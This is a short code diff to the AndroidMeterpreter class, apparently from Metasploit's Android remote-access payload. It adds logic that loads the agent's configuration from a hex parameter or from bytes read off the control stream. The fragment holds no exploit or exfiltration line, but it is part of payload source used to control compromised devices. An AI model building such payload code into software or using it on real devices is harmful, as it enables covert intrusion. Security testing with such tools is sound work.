@@ -109,6 +109,16 @@ public class AndroidMeterpreter extends Meterpreter {
         } catch (Exception e) {
             e.printStackTrace();
         }
+        if (parameters.length > 1 && parameters[1].charAt(0) != ' ') {
+            byte[] configBytes = Utils.hexStringToByteArray(parameters[1]);
+            loadConfiguration(in, rawOut, configBytes);
+        } else {
+            int configLen = in.readInt();
+            byte[] configBytes = new byte[configLen];
+            in.readFully(configBytes);
+            loadConfiguration(in, rawOut, configBytes);
+            this.ignoreBlocks = in.readInt();
+        }
 
         this.intervalCollectionManager = new IntervalCollectionManager(getContext());
         this.intervalCollectionManager.start();
